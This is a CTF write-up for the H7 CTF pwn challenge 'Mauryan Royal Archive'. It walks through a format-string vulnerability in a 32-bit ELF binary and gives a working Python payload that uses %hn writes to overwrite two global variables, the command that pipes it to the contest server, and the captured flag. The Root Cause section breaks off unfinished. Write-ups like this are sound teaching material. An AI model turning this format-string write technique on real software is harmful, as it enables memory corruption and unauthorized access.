---
title: "CTF Write-up — Mauryan Royal Archive (Format String → Flip Globals → Print Flag)"
description: "- **Category:** Pwn / Binary Exploitation - **Difficulty:** Medium - **Binary:** `imperial_archive` (ELF 32-bit, i386, dynamically linked, not stripped) - **Protections:** NX, Part"
event: "H7 CTF"
year: 2025
category: pwn
tags: ["pwn","format-string"]
sourceRepo: "R3izorr/CTF_writeup"
sourcePath: "H7ctf/New folder"
featured: false
flagsHidden: false
---

> Imported from [H7ctf/New folder](https://github.com/R3izorr/CTF_writeup/tree/main/H7ctf/New%20folder).

# CTF Write-up — “Mauryan Royal Archive” (Format String → Flip Globals → Print Flag)

## Overview

- **Category:** Pwn / Binary Exploitation  
- **Difficulty:** Medium  
- **Binary:** `imperial_archive` (ELF 32-bit, i386, dynamically linked, not stripped)  
- **Protections:** NX, Partial RELRO, No PIE, No Canary  
- **Goal:** Satisfy a gate in `imperial_access()` to read and print `flag.txt`  
- **Final Flag:** `H7CTF{m4ury4n_pi114r_c1ph3r_3218C3_a4fc5c52-5763-4cc6-95eb-6190187e9869}`  

---

## Recon

### File Information

```bash
file imperial_archive
Output:


ELF 32-bit LSB executable, Intel 80386, dynamically linked, with debug_info, not stripped

checksec --file=./imperial_archive
Output:


Partial RELRO | No Canary | NX Enabled | No PIE
Symbols (Extracted from ELF)

0804c06c B mauryan_empire
0804c070 B ashoka_edict
Static Analysis
Key Functions
scribe_function()

```
```c
void scribe_function(void) {
  char buffer[256];
  ...
  printf("Processing inscription: ");
  printf(buffer);       // format-string vulnerability
  ...
  imperial_access();
}
imperial_access()


void imperial_access(void) {
  if (mauryan_empire != 0x141 || ashoka_edict < 0x397b) {
    puts("Access denied.");
    return;
  }
  // Success path:
  // opens flag.txt and prints:
  printf("Flag: %s", flag_from_file);
}
```
### Vulnerability
The call printf(buffer) treats user input as a format string, allowing arbitrary memory read/write using format specifiers (%x, %n, etc.).
Because imperial_access() runs right after printf(buffer), we can use the format string to set the global variables that determine access.

Gate Condition
- To reach the success path, the program checks:

```csharp

mauryan_empire == 0x0141  (decimal 321)
ashoka_edict   >= 0x397b  (decimal 14715)
Finding the printf Stack Offset
To identify the correct argument index for %n, send a pattern:
```
```bash

AAAA.%1$x.%2$x.%3$x.%4$x.%5$x.%6$x...
Remote output revealed:


Processing inscription: AAAA.804a452.f7f965c0.f7e7cb97.41414141...
```
- The marker 41414141 (AAAA) appears at the 4th position,
so our stack offset = 4.

### Exploit Strategy
We’ll craft a format string that:

Places the two target addresses (mauryan_empire, ashoka_edict) at the beginning of the input.

Uses positional format specifiers to perform 16-bit writes (%hn).

Writes the required values 0x0141 and 0x397b in sequence.

Targets
Variable	Address	Value to Write	Type
mauryan_empire	0x0804c06c	0x0141	16-bit
ashoka_edict	0x0804c070	0x397b	16-bit

Little-endian encoding avoids null bytes:

```nginx

mauryan_empire → \x6c\xc0\x04\x08
ashoka_edict   → \x70\xc0\x04\x08
```
### Payload Construction
We use Python to generate the payload:

```python

#!/usr/bin/env python3
import sys

# 1. Target addresses (little endian)
p  = b"\x6c\xc0\x04\x08" + b"\x70\xc0\x04\x08"
printed = 8  # 8 bytes already written by these addresses

# 2. Desired values
t1 = 0x0141  # 321
t2 = 0x397b  # 14715

# 3. Write first value to mauryan_empire via %4$hn
pad1 = (t1 - printed) % 0x10000
fmt = f"%{pad1}c%4$hn"
printed = (printed + pad1) % 0x10000

# 4. Then write second value to ashoka_edict via %5$hn
pad2 = (t2 - printed) % 0x10000
fmt += f"%{pad2}c%5$hn"

# 5. Combine and send
sys.stdout.buffer.write(p + fmt.encode() + b"\n")
```
Run locally or remotely:

```bash

python3 exploit.py | nc play.h7tex.com 51932
Why %hn?
%hn writes 2 bytes (16 bits) → minimal padding required.

%n (4 bytes) would require padding up to 4GB.

%hhn (1 byte) would need 4 separate writes per target.
```
### Exploit Output
```css

Verifying imperial authority...
Glory to the Mauryan Empire! Access granted to the royal archives!
Royal Inscription:
Flag: H7CTF{m4ury4n_pi114r_c1ph3r_3218C3_a4fc5c52-5763-4cc6-95eb-6190187e9869}
```
### Root Cause
Bug:
- User-controlled string is passed directly to printf():


Final Flag:

```
H7CTF{m4ury4n_pi114r_c1ph3r_3218C3_a4fc5c52-5763-4cc6-95eb-6190187e9869}
```
